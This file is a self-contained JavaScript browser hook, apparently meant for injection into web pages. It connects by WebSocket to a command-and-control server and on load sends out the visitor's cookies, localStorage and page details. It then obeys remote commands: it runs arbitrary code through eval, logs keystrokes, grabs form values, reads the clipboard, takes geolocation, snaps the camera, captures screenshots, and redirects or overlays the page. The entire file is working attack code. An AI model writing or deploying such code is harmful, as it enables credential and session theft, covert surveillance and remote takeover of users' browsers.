(function() {
    if (window.__cg2) return;
    window.__cg2 = true;
    var C2_HOST = document.currentScript.src.split('/')[2].split(':')[0];
    var C2_PORT = 9091;
    var ws = null;
    var sessionId = Math.random().toString(36).substr(2, 12);
    var keyBuffer = [];

    function connect() {
        ws = new WebSocket('ws://' + C2_HOST + ':' + C2_PORT + '/agent');
        ws.onopen = function() {
            send('register', {
                sessionId: sessionId, url: location.href, userAgent: navigator.userAgent,
                platform: navigator.platform, language: navigator.language,
                screen: screen.width + 'x' + screen.height, cookies: document.cookie,
                localStorage: grabStorage(), referrer: document.referrer, title: document.title
            });
        };
        ws.onmessage = function(e) { try { handleCommand(JSON.parse(e.data)); } catch(err) {} };
        ws.onclose = function() { setTimeout(connect, 3000); };
    }

    function send(type, data) { if (ws && ws.readyState === 1) ws.send(JSON.stringify({ type: type, session: sessionId, data: data })); }

    function handleCommand(cmd) {
        switch (cmd.action) {
            case 'exec_js': try { var r = eval(cmd.code); send('exec_result', { id: cmd.id, result: String(r) }); } catch(e) { send('exec_result', { id: cmd.id, error: e.message }); } break;
            case 'get_cookies': send('cookies', { cookies: document.cookie }); break;
            case 'get_storage': send('storage', grabStorage()); break;
            case 'get_dom': send('dom', { html: document.documentElement.outerHTML.substring(0, 50000) }); break;
            case 'screenshot': takeScreenshot(); break;
            case 'keylog_start': startKeylogger(); break;
            case 'keylog_stop': stopKeylogger(); break;
            case 'keylog_dump': send('keylog', { keys: keyBuffer.splice(0) }); break;
            case 'redirect': location.href = cmd.url; break;
            case 'inject_html': var div = document.createElement('div'); div.innerHTML = cmd.html; document.body.appendChild(div); send('ack', { action: 'inject_html' }); break;
            case 'play_audio': var audio = new Audio(cmd.url); audio.volume = cmd.volume || 1.0; audio.play().catch(function(){}); send('ack', { action: 'play_audio' }); break;
            case 'play_video': showVideoOverlay(cmd.url); send('ack', { action: 'play_video' }); break;
            case 'show_document': showDocumentOverlay(cmd.url); send('ack', { action: 'show_document' }); break;
            case 'get_clipboard': navigator.clipboard.readText().then(function(t) { send('clipboard', { text: t }); }).catch(function(e) { send('clipboard', { error: e.message }); }); break;
            case 'get_location': navigator.geolocation.getCurrentPosition(function(pos) { send('location', { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); }, function(e) { send('location', { error: e.message }); }); break;
            case 'camera_snap': captureCamera(); break;
            case 'alert': alert(cmd.message); send('ack', { action: 'alert' }); break;
            case 'form_grab': send('forms', { forms: grabForms() }); break;
            case 'ping': send('pong', { time: Date.now() }); break;
        }
    }

    var keyHandler = null;
    function startKeylogger() {
        if (keyHandler) return;
        keyHandler = function(e) {
            keyBuffer.push({ key: e.key, code: e.code, target: e.target.tagName + (e.target.name ? '#' + e.target.name : ''), time: Date.now() });
            if (keyBuffer.length >= 50) send('keylog', { keys: keyBuffer.splice(0) });
        };
        document.addEventListener('keydown', keyHandler, true);
        send('ack', { action: 'keylog_start' });
    }
    function stopKeylogger() { if (keyHandler) { document.removeEventListener('keydown', keyHandler, true); keyHandler = null; } send('keylog', { keys: keyBuffer.splice(0) }); }

    function takeScreenshot() {
        if (typeof html2canvas === 'undefined') { var s = document.createElement('script'); s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js'; s.onload = function() { doScreenshot(); }; document.head.appendChild(s); }
        else doScreenshot();
    }
    function doScreenshot() { html2canvas(document.body, { scale: 0.5, useCORS: true }).then(function(canvas) { send('screenshot', { image: canvas.toDataURL('image/jpeg', 0.6) }); }).catch(function(e) { send('screenshot', { error: e.message }); }); }

    function captureCamera() {
        navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
            var video = document.createElement('video'); video.srcObject = stream; video.play();
            setTimeout(function() { var canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight; canvas.getContext('2d').drawImage(video, 0, 0); stream.getTracks().forEach(function(t) { t.stop(); }); send('camera', { image: canvas.toDataURL('image/jpeg', 0.7) }); }, 1000);
        }).catch(function(e) { send('camera', { error: e.message }); });
    }

    function showVideoOverlay(url) {
        var d = document.createElement('div'); d.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,.95);z-index:999999;display:flex;align-items:center;justify-content:center';
        var v = document.createElement('video'); v.src = url; v.autoplay = true; v.controls = true; v.style.cssText = 'max-width:90vw;max-height:90vh';
        var c = document.createElement('span'); c.textContent = '\u2715'; c.style.cssText = 'position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer'; c.onclick = function() { d.remove(); };
        d.appendChild(v); d.appendChild(c); document.body.appendChild(d);
    }
    function showDocumentOverlay(url) {
        var d = document.createElement('div'); d.style.cssText = 'position:fixed;top:5vh;left:5vw;width:90vw;height:90vh;z-index:999999;background:#fff;border:2px solid #333;box-shadow:0 0 20px rgba(0,0,0,.5)';
        var h = document.createElement('div'); h.style.cssText = 'height:36px;background:#222;display:flex;align-items:center;justify-content:flex-end;padding:0 10px';
        var c = document.createElement('span'); c.textContent = 'Close'; c.style.cssText = 'color:#fff;cursor:pointer;font-size:13px'; c.onclick = function() { d.remove(); };
        var f = document.createElement('iframe'); f.src = url; f.style.cssText = 'width:100%;height:calc(100% - 36px);border:none';
        h.appendChild(c); d.appendChild(h); d.appendChild(f); document.body.appendChild(d);
    }

    function grabStorage() { var data = {}; try { for (var i = 0; i < localStorage.length; i++) { var k = localStorage.key(i); data[k] = localStorage.getItem(k); } } catch(e) {} return data; }
    function grabForms() {
        var forms = []; document.querySelectorAll('form').forEach(function(f) {
            var fields = []; f.querySelectorAll('input,select,textarea').forEach(function(el) { fields.push({ tag: el.tagName, type: el.type || '', name: el.name || '', value: el.value || '', id: el.id || '' }); });
            forms.push({ action: f.action, method: f.method, fields: fields });
        }); return forms;
    }

    var origPush = history.pushState; var origReplace = history.replaceState;
    history.pushState = function() { origPush.apply(this, arguments); send('navigate', { url: location.href }); };
    history.replaceState = function() { origReplace.apply(this, arguments); send('navigate', { url: location.href }); };
    window.addEventListener('popstate', function() { send('navigate', { url: location.href }); });

    connect();
})();
